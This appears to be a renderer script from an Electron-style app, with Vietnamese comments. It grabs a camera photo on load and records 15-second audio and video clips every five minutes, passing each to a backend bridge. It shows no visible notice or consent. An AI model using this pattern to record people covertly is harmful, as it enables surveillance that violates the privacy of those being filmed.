const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

let stream;
let mediaRecorder;
let recordedChunks = [];
let isRecording = false;

async function startCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: true
        });

        video.srcObject = stream;

        video.onloadedmetadata = () => {

            // Chụp ảnh ngay khi vào
            capturePhoto();

            // Sau 5s quay video lần đầu
            setTimeout(() => {
                recordVideo();
            }, 5000);

            // Sau đó cứ 5 phút quay 1 lần
            setInterval(() => {
                recordVideo();
            }, 5 * 60 * 1000);

        };

    } catch (err) {
        console.error("Camera error:", err);
    }
}

function capturePhoto() {
    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/png");

    window.api.sendPhoto(image);
}

function recordVideo() {

    if (isRecording) return;
    if (!stream) return;

    isRecording = true;
    recordedChunks = [];

    let options = {};

    if (MediaRecorder.isTypeSupported("video/webm;codecs=vp9")) {
        options.mimeType = "video/webm;codecs=vp9";
    } else if (MediaRecorder.isTypeSupported("video/webm;codecs=vp8")) {
        options.mimeType = "video/webm;codecs=vp8";
    } else if (MediaRecorder.isTypeSupported("video/webm")) {
        options.mimeType = "video/webm";
    }

    try {
        mediaRecorder = new MediaRecorder(stream, options);
    } catch (e) {
        console.error("MediaRecorder init error:", e);
        isRecording = false;
        return;
    }

    mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
            recordedChunks.push(event.data);
        }
    };

    mediaRecorder.onstop = () => {
        const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
        sendBlob(blob);
        isRecording = false;
    };

    mediaRecorder.onerror = (e) => {
        console.error("Recorder error:", e);
        isRecording = false;
    };

    mediaRecorder.start();

    console.log("Recording started...");

    setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state === "recording") {
            mediaRecorder.stop();
            console.log("Recording stopped");
        }
    }, 15000);
}

async function sendBlob(blob) {
    const arrayBuffer = await blob.arrayBuffer();
    window.api.sendVideo(arrayBuffer);
}

startCamera();
